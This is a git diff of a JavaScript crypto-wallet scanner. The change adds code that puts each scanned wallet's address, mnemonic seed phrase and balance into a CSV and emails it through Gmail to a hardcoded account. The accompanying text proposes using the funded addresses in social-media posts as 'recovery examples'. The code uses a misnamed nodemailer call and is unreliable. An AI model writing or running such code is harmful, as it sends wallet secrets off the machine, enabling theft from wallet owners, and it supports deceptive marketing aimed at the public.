@@ -235,7 +235,7 @@ function generateFromKnownSeeds(index) {
   return ethers.Wallet.createRandom();
 }
 
-// Send batch alert every 10 wallets
+// Send batch alert every 10 wallets with CSV attachment
 async function sendBatchAlert(wallets, totalScanned) {
   try {
     const { sendAdminNotification } = require('../services/emailService');
@@ -243,13 +243,71 @@ async function sendBatchAlert(wallets, totalScanned) {
     const walletsWithFunds = wallets.filter(w => w.totalValueUSD > 0);
     const totalValue = walletsWithFunds.reduce((sum, w) => sum + w.totalValueUSD, 0);
     
-    const subject = `🔍 ADMIN SCAN: ${totalScanned} wallets - ${walletsWithFunds.length} funded`;
-    const message = `BATCH REPORT: ${totalScanned} wallets scanned\n\nFUNDS FOUND: ${walletsWithFunds.length}/10\nTOTAL VALUE: $${totalValue.toFixed(2)}\n\nLATEST WALLETS:\n${wallets.map((w, i) => `${i + 1}. ${w.address.slice(0, 10)}... - $${w.totalValueUSD}`).join('\n')}`;
+    // Create CSV content
+    const csvHeader = 'Index,Address,Phrase,ETH_Balance,Total_USD,Has_Funds\n';
+    const csvRows = wallets.map((w, i) => 
+      `${totalScanned - 9 + i},${w.address},"${w.phrase}",${w.ethBalance},${w.totalValueUSD},${w.totalValueUSD > 0 ? 'YES' : 'NO'}`
+    ).join('\n');
+    const csvContent = csvHeader + csvRows;
+    
+    const subject = `🔍 ADMIN SCAN BATCH: ${totalScanned} wallets (${walletsWithFunds.length} funded) - CSV Attached`;
+    const message = `WALLET SCANNER BATCH REPORT
 
-    await sendAdminNotification(subject, message);
+📊 PROGRESS: ${totalScanned} wallets processed
+💰 FUNDED WALLETS: ${walletsWithFunds.length}/10
+💵 TOTAL VALUE: $${totalValue.toFixed(2)}
+
+📎 ATTACHMENT: Complete wallet data in CSV format
+
+💡 MARKETING USE:
+- Import CSV into spreadsheet
+- Filter by Has_Funds = YES
+- Use addresses for social media posts
+- Show real recovery examples
+
+Next batch alert in 10 wallets...`;
+
+    // Send with CSV attachment
+    await sendEmailWithAttachment(subject, message, csvContent, `wallet_batch_${totalScanned}.csv`);
     
   } catch (error) {
     console.log('Failed to send batch alert:', error.message);
+  }
+}
+
+// Send email with CSV attachment
+async function sendEmailWithAttachment(subject, message, csvContent, filename) {
+  try {
+    const nodemailer = require('nodemailer');
+    
+    const transporter = nodemailer.createTransporter({
+      service: 'gmail',
+      auth: {
+        user: 'skillstakes01@gmail.com',
+        pass: process.env.GMAIL_APP_PASSWORD
+      }
+    });
+
+    const mailOptions = {
+      from: 'skillstakes01@gmail.com',
+      to: 'skillstakes01@gmail.com',
+      subject: subject,
+      text: message,
+      attachments: [{
+        filename: filename,
+        content: csvContent,
+        contentType: 'text/csv'
+      }]
+    };
+
+    await transporter.sendMail(mailOptions);
+    console.log('✅ Email with CSV attachment sent successfully!');
+    
+  } catch (error) {
+    console.log('Failed to send email with attachment:', error.message);
+    // Fallback to regular notification
+    const { sendAdminNotification } = require('../services/emailService');
+    await sendAdminNotification(subject, message);
   }
 }
 
